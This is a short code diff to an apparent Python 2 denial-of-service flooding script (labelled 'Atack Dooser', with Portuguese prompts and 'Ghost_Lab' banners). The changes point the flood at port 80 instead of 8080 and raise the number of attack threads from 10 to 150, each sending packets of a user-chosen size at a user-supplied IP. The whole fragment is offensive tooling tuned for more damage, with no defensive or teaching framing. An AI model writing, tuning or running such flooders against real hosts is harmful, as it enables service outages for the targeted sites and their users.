@@ -96,7 +96,7 @@ try:
   print('')
   pckt = raw_input(colors.amarelo + "[*] Packets Size >> ")
   print('')
-  port = 8080
+  port = 80
   Animation(' Starting Atack Dooser IP Packets...')
   print('')
   print(Ghost_Lab.Status_Banner)
@@ -106,7 +106,7 @@ try:
   print(Ghost_Lab.End_Status)
   time.sleep(2)
   print('')
-  threads = 10
+  threads = 150
   for host in range(int(threads)):
       BlackRabitt = attack(ip, int(port), int(pckt))
       BlackRabitt.start()
